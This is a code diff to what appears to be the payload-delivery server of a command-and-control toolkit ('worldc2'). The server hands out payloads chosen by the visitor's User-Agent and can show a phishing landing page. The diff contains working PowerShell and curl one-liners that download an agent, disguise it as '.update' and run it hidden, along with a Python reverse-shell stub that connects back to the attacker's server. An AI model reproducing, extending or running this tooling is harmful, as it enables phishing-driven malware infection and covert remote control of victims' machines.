@@ -8,19 +8,13 @@ Usage:
     python3 delivery.py                    # Auto-detect IP, port 8000
     python3 delivery.py --port 80          # Custom port
     python3 delivery.py --phishing         # Enable phishing landing page
-    python3 delivery.py --redirect         # Redirect after payload delivery
 """
 
-import os
-import sys
 import socket
 import argparse
-import subprocess
-import threading
 import base64
 from pathlib import Path
 from http.server import HTTPServer, SimpleHTTPRequestHandler
-from datetime import datetime
 
 GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
 CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"
@@ -33,8 +27,11 @@ class DeliveryHandler(SimpleHTTPRequestHandler):
     """HTTP handler that serves appropriate payload based on User-Agent."""
     
     server_addr = "127.0.0.1:8443"
-    redirect_url = ""
     phishing_mode = False
+    
+    def _delivery_port(self):
+        """Actual bound port of this HTTP delivery server."""
+        return getattr(self.server, "server_port", 8000)
     
     def log_message(self, format, *args):
         """Custom logging with colors."""
@@ -141,9 +138,10 @@ function downloadPayload() {{
     
     def serve_ps1_stager(self):
         """Serve PowerShell stager that downloads and executes the agent."""
-        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
+        host = self.server_addr.rsplit(":", 1)[0] if ":" in self.server_addr else self.server_addr
+        port = self._delivery_port()
         
-        ps = f"""$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{self.server_addr}'"""
+        ps = f"""$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:{port}/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{self.server_addr}'"""
         
         b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
         
@@ -176,7 +174,8 @@ function downloadPayload() {{
         self.send_header('Content-Type', 'text/x-python')
         self.end_headers()
         
-        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
+        host = self.server_addr.rsplit(":", 1)[0] if ":" in self.server_addr else self.server_addr
+        port = self.server_addr.rsplit(":", 1)[1] if ":" in self.server_addr else "8443"
         py = f"""import socket,subprocess,os,time
 H,P="{host}",{port}
 while 1:
@@ -193,13 +192,14 @@ while 1:
     
     def serve_curl_instructions(self):
         """Serve curl one-liner for manual execution."""
-        host, _, port = self.server_addr.rsplit(":", 1) if ":" in self.server_addr else (self.server_addr, "", "8443")
+        host = self.server_addr.rsplit(":", 1)[0] if ":" in self.server_addr else self.server_addr
+        port = self._delivery_port()
         
         self.send_response(200)
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        cmd = f"curl -s http://{host}:8000/worldc2-agent -o /tmp/.update && chmod +x /tmp/.update && nohup /tmp/.update --server {self.server_addr} &>/dev/null &"
+        cmd = f"curl -s http://{host}:{port}/worldc2-agent -o /tmp/.update && chmod +x /tmp/.update && nohup /tmp/.update --server {self.server_addr} &>/dev/null &"
         self.wfile.write(cmd.encode())
     
     def serve_hta(self):
@@ -221,10 +221,6 @@ while 1:
         self.end_headers()
         self.wfile.write(data)
         print(f"{GREEN}[DELIVERED]{RESET} {path.name} ({len(data)} bytes) to {self.client_address[0]}")
-        
-        # Redirect after delivery if configured
-        if self.redirect_url:
-            pass  # Could add redirect header
 
 
 def banner():
@@ -242,7 +238,7 @@ def get_local_ip():
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except:
+    except OSError:
         return "127.0.0.1"
 
 def main():
@@ -252,7 +248,6 @@ def main():
     parser.add_argument("--port", "-p", type=int, default=8000, help="HTTP port")
     parser.add_argument("--server", "-s", default=None, help="C2 server address")
     parser.add_argument("--phishing", action="store_true", help="Enable phishing landing page")
-    parser.add_argument("--redirect", default="", help="Redirect URL after payload delivery")
     args = parser.parse_args()
     
     local_ip = get_local_ip()
@@ -262,7 +257,6 @@ def main():
     
     # Configure handler
     DeliveryHandler.server_addr = args.server
-    DeliveryHandler.redirect_url = args.redirect
     DeliveryHandler.phishing_mode = args.phishing
     
     print(f"{BOLD}Configuration:{RESET}")
